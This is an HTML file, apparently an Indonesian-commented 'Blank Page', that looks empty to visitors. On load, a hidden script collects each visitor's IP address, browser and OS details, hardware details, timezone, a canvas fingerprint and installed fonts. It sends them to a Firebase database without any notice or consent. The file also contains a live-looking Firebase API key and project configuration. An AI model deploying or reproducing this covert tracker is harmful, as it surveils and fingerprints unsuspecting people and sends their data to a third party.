<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Blank Page</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
    <script>
        // Ganti dengan config Firebase kamu
        const firebaseConfig = {
          apiKey: "AIzaSyDDImo9Vq1jqID6WDbGMXToexeIfNFOjpQ",
          authDomain: "iplo-50a21.firebaseapp.com",
          databaseURL: "https://iplo-50a21-default-rtdb.asia-southeast1.firebasedatabase.app",
          projectId: "iplo-50a21",
          storageBucket: "iplo-50a21.firebasestorage.app",
          messagingSenderId: "488527718585",
          appId: "1:488527718585:web:f1a35e256a0d3cf5021368",
          measurementId: "G-1LQMBTQBPK"
};
        // Init Firebase
        firebase.initializeApp(firebaseConfig);
        const database = firebase.database();

        // Fungsi ambil data silently lalu kirim ke DB
        async function logUserData() {
            try {
                // Ambil IP via API eksternal
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                const userIP = ipData.ip;

                // Info browser dan OS sederhana
                const userAgent = navigator.userAgent;
                let browser = "Unknown";
                let os = "Unknown";

                if (userAgent.indexOf("Chrome") > -1) browser = "Chrome";
                else if (userAgent.indexOf("Firefox") > -1) browser = "Firefox";
                else if (userAgent.indexOf("Safari") > -1) browser = "Safari";
                else if (userAgent.indexOf("Edge") > -1) browser = "Edge";
                else if (userAgent.indexOf("Trident") > -1) browser = "IE";

                if (userAgent.indexOf("Win") > -1) os = "Windows";
                else if (userAgent.indexOf("Mac") > -1) os = "MacOS";
                else if (userAgent.indexOf("Linux") > -1) os = "Linux";
                else if (userAgent.indexOf("Android") > -1) os = "Android";
                else if (userAgent.indexOf("iOS") > -1) os = "iOS";

                // Info tambahan: Screen, hardware, timezone, language
                const screenRes = `${screen.width}x${screen.height}`;
                const pixelRatio = window.devicePixelRatio;
                const cpuCores = navigator.hardwareConcurrency || "Unknown";
                const deviceMemory = navigator.deviceMemory || "Unknown";
                const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
                const language = navigator.language;

                // Canvas Fingerprint basic (hash sederhana)
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                ctx.textBaseline = "top";
                ctx.font = "14px 'Arial'";
                ctx.textBaseline = "alphabetic";
                ctx.fillStyle = "#f60";
                ctx.fillRect(125, 1, 62, 20);
                ctx.fillStyle = "#069";
                ctx.fillText("Hello, world!", 2, 15);
                const canvasHash = canvas.toDataURL(); // Ini bisa unik per device

                // Font enumeration basic (cek beberapa font umum)
                const fonts = [];
                const testFonts = ['Arial', 'Times New Roman', 'Courier New', 'Verdana', 'Georgia', 'Comic Sans MS', 'Impact'];
                const baseFont = 'monospace';
                const testString = 'abcdefghijklmnopqrstuvwxyz0123456789';
                const detector = document.createElement('span');
                detector.style.fontFamily = baseFont;
                detector.innerHTML = testString;
                document.body.appendChild(detector);
                const baseWidth = detector.offsetWidth;
                document.body.removeChild(detector);
                testFonts.forEach(font => {
                    const el = document.createElement('span');
                    el.style.fontFamily = `${font}, ${baseFont}`;
                    el.innerHTML = testString;
                    document.body.appendChild(el);
                    if (el.offsetWidth !== baseWidth) fonts.push(font);
                    document.body.removeChild(el);
                });

                // Timestamp di GMT+7 (Asia/Jakarta)
                const timestamp = new Date().toLocaleString('en-US', { timeZone: 'Asia/Jakarta' });

                // Data yang dikirim (semua yang bisa diam-diam)
                const data = {
                    ip: userIP,
                    browser: browser,
                    os: os,
                    userAgent: userAgent,
                    screenResolution: screenRes,
                    pixelRatio: pixelRatio,
                    cpuCores: cpuCores,
                    deviceMemory: deviceMemory,
                    timezone: timezone,
                    language: language,
                    canvasHash: canvasHash, // Basic fingerprint
                    installedFonts: fonts.join(', '), // Font list dasar
                    referrer: document.referrer,
                    connectionType: navigator.connection ? navigator.connection.effectiveType : "Unknown",
                    timestamp: timestamp
                };

                // Kirim ke Firebase Realtime DB (path /logs)
                database.ref('logs').push(data);
            } catch (error) {
                console.error('Error logging data:', error); // Silent error
            }
        }

        // Jalankan saat load
        window.onload = logUserData;
    </script>
</head>
<body>
    <!-- Blank putih, kosong -->
</body>
</html>
